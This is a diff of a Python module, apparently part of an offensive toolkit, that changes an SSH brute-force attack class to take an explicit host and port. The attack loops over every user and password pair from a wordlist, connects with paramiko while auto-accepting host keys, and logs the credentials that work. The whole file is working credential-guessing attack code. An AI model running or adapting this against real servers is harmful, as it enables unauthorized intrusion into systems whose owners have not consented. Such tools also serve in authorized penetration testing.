@@ -2,27 +2,22 @@ from .abstract import Abstract
 import paramiko
 
 class Attaque(Abstract):
-    def __init__(self, ref):
+    def __init__(self, ref, host, port):
 
-        Abstract.__init__(ref)
+        Abstract.__init__(ref, host, port)
     
     def run(self):
-        for ip_,ports_ in self.cibles.items():
-            addresses = ip_
-            ports = ports_ 
         client = paramiko.SSHClient()
         with open("../files/wordlists/rockworm.txt") as wordlist:
             words = wordlist.readlines()
-            for address in addresses:
-                for port in ports:
-                    for user in words:
-                        user = user.strip()
-                        for passwd in words:
-                            passwd = passwd.strip()
-                            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                            try:
-                                client.connect(address, username=user, password=passwd)
-                                client.close()
-                                self.bilan(f"ssh_bruteforce{[address, user,passwd]}")
-                            except:
-                                pass
+            for user in words:
+                user = user.strip()
+                for passwd in words:
+                    passwd = passwd.strip()
+                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    try:
+                        client.connect(self.host, port=self.port, username=user, password=passwd)
+                        client.close()
+                        self.bilan(f"ssh_bruteforce{[self.host, user,passwd]}")
+                    except:
+                        pass
